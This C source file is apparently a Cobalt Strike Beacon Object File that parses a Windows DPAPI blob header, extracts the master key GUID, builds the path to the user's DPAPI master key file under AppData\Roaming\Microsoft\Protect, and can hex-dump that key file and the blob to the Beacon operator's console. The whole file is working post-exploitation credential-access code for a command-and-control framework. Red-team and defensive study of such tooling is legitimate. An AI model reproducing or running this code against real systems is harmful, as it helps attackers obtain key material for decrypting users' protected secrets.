#include <windows.h>
#include <sddl.h>
#include "beacon.h"
#include "utils.h"

// Global output object managed by BeaconFormat API
formatp outputbuffer;
BOOL g_DUMP_RAW = FALSE;

// Helper to read a file and append its hex representation to the output buffer
void dumpFileBytes(char* filePath) {
    if (!g_DUMP_RAW) return;

    HANDLE hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(&outputbuffer, "[-] Could not open for dumping: %s\n", filePath);
        return;
    }

    char buffer[1024];
    DWORD bytesRead = 0;
    if (KERNEL32$ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
        BeaconFormatPrintf(&outputbuffer, "[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
        for (DWORD i = 0; i < bytesRead; i++) {
            BeaconFormatPrintf(&outputbuffer, "\\x%02X", (unsigned char)buffer[i]);
            // Format output into 32-byte chunks for readability
            if ((i + 1) % 32 == 0) BeaconFormatPrintf(&outputbuffer, "\n");
        }
        BeaconFormatPrintf(&outputbuffer, "\n[+] End of Dump\n");
    }
    KERNEL32$CloseHandle(hFile);
}

// Core logic: Parses a DPAPI blob to extract the associated Master Key GUID
void parseFile(char* filePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char buffer[2048]; 
    DWORD bytesRead;
    
    // Declare all necessary variables for GUID and Path resolution
    char guidStr[37] = {0};
    char mkPath[MAX_PATH] = {0};
    char *szSid = NULL;

    hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    if (!KERNEL32$ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        KERNEL32$CloseHandle(hFile);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    // DPAPI Blob header "magic" bytes (Version 1, Provider GUID: {df9d8cd0-1501-11d1-8c7a-00c04fc297eb})
    static char magic[] = { 0x01,0x00,0x00,0x00,0xD0,0x8C,0x9D,0xDF,0x01,0x15,0xD1,0x11,0x8C,0x7A,0x00,0xC0,0x4F,0xC2,0x97,0xEB };
    int idx = IndexOfBytes(buffer, (int)bytesRead, magic, sizeof(magic));

    if (idx >= 0) {
        int currentPos = idx;
        BeaconFormatPrintf(&outputbuffer, "[*] Blob Structure for: %s\n", filePath);

        // 1. dwVersion
        DWORD dwVersion = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "dwVersion:           %08X\n", dwVersion);
        currentPos += 4;

        // 2. guidProvider
        currentPos += 16; 

        // 3. dwMasterKeyVersion
        DWORD mkVersion = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "dwMasterKeyVersion:  %d\n", mkVersion);
        currentPos += 4;

        // 4. guidMasterKey 
        char mkGuidRaw[16];
        memcpy(mkGuidRaw, buffer + currentPos, 16);

        // Break down GUID into components to handle little-endian formatting
        char g1[4], g2[2], g3[2], g4[2], g5[6];
        memcpy(g1, mkGuidRaw, 4); memcpy(g2, mkGuidRaw + 4, 2); memcpy(g3, mkGuidRaw + 6, 2);
        memcpy(g4, mkGuidRaw + 8, 2); memcpy(g5, mkGuidRaw + 10, 6);
        
        // DPAPI GUIDs store the first three blocks in Little-Endian
        reverseBytes(g1, 4); reverseBytes(g2, 2); reverseBytes(g3, 2);

        snprintf(guidStr, sizeof(guidStr), 
            "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            (unsigned char)g1[0], (unsigned char)g1[1], (unsigned char)g1[2], (unsigned char)g1[3],
            (unsigned char)g2[0], (unsigned char)g2[1], (unsigned char)g3[0], (unsigned char)g3[1],
            (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
            (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);

        BeaconFormatPrintf(&outputbuffer, "guidMasterKey:       %s\n", guidStr);

        // Get current user SID to build the path to the expected Master Key file
        HANDLE hToken;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DWORD len = 0;
            ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
            PTOKEN_USER pTUser = (PTOKEN_USER)malloc(len);
            if (pTUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTUser, len, &len)) {
                char *tempSid = NULL;
                if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &tempSid)) {
                    // We duplicate the SID string so we can manage it ourselves for the CSV
                    size_t sidLen = strlen(tempSid);
                    szSid = (char*)malloc(sidLen + 1);
                    if (szSid) memcpy(szSid, tempSid, sidLen + 1);
                    
                    char szProfilePath[MAX_PATH];
                    if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
                        // Construct path to the Master Key file in AppData
                        snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                 szProfilePath, szSid, guidStr);
                        dumpFileBytes(mkPath);
                    }
                    KERNEL32$LocalFree(tempSid); // Free the one allocated by Windows
                }
            }
            if (pTUser) free(pTUser);
            KERNEL32$CloseHandle(hToken);
        }
        currentPos += 16;

        // 5. dwFlags
        DWORD dwFlags = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "dwFlags:             %08X\n", dwFlags);
        currentPos += 4;

        // 6. Description
        DWORD descLen = *(DWORD*)(buffer + currentPos);
        currentPos += 4;
        if (descLen > 0 && (currentPos + descLen) < bytesRead) {
            wchar_t* szDesc = (wchar_t*)malloc(descLen + 2);
            if (szDesc) {
                memcpy(szDesc, buffer + currentPos, descLen);
                szDesc[descLen/2] = L'\0';
                BeaconFormatPrintf(&outputbuffer, "szDescription:       %ls (%d bytes)\n", szDesc, descLen);
                free(szDesc);
            }
            currentPos += descLen;
        }

        // 7. Crypt Algorithm
        DWORD algCrypt = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "algCrypt:            %08X\n", algCrypt);
        currentPos += 4;

        // 8. Crypt Algorithm Len
        DWORD algCryptLen = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "dwAlgCryptLen:       %d\n", algCryptLen);
        currentPos += 4;

        // 9. Salt
        DWORD saltLen = *(DWORD*)(buffer + currentPos);
        currentPos += 4;
        BeaconFormatPrintf(&outputbuffer, "dwSaltLen:           %d\n", saltLen);
        if (saltLen > 0 && (currentPos + saltLen) < bytesRead) {
            currentPos += saltLen;
        }

        // 10. HMAC Key Len
        DWORD hmacKeyLen = *(DWORD*)(buffer + currentPos);
        currentPos += 4;
        BeaconFormatPrintf(&outputbuffer, "dwHmacKeyLen:        %d\n", hmacKeyLen);
        currentPos += hmacKeyLen;

        // 11. Hash Algorithm
        DWORD algHash = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "algHash:             %08X\n", algHash);
        currentPos += 4;

        // 12. Hash Algorithm Len
        DWORD algHashLen = *(DWORD*)(buffer + currentPos);
        BeaconFormatPrintf(&outputbuffer, "dwAlgHashLen:        %d\n", algHashLen);
        currentPos += 4;

        // 13. Data
        DWORD dataLen = *(DWORD*)(buffer + currentPos);
        currentPos += 4;
        BeaconFormatPrintf(&outputbuffer, "dwDataLen:           %d\n", dataLen);
        currentPos += dataLen;

        // 14. Sign
        DWORD signLen = *(DWORD*)(buffer + currentPos);
        currentPos += 4;
        BeaconFormatPrintf(&outputbuffer, "dwSignLen:           %d\n", signLen);
        dumpFileBytes(filePath);
        BeaconFormatPrintf(&outputbuffer, "[+] End of Blob Analysis\n--------------------------------\n");

        if (szSid) free(szSid);
    }
}

// Entry point for the BOF
void go(char* args, int len) {
    datap parser;
    char* filePath = NULL;
    int filePathLen = 0;
    int dumpFlag = 0;

    // Extract arguments passed from the Aggressor Script
    BeaconDataParse(&parser, args, len);
    filePath = BeaconDataExtract(&parser, &filePathLen);
    dumpFlag = BeaconDataInt(&parser);
    g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;

    // Allocate the dynamic output buffer (initially 16KB) should it be lower?
    BeaconFormatAlloc(&outputbuffer, 16384);

    if (filePath == NULL) {
        BeaconFormatPrintf(&outputbuffer, "[-] No file path provided.\n");
    } else {                    
        parseFile(filePath);
    }

    BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");

    // Flush the dynamic buffer to the Beacon console
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));

    // Release the heap memory back to the system
    BeaconFormatFree(&outputbuffer);
}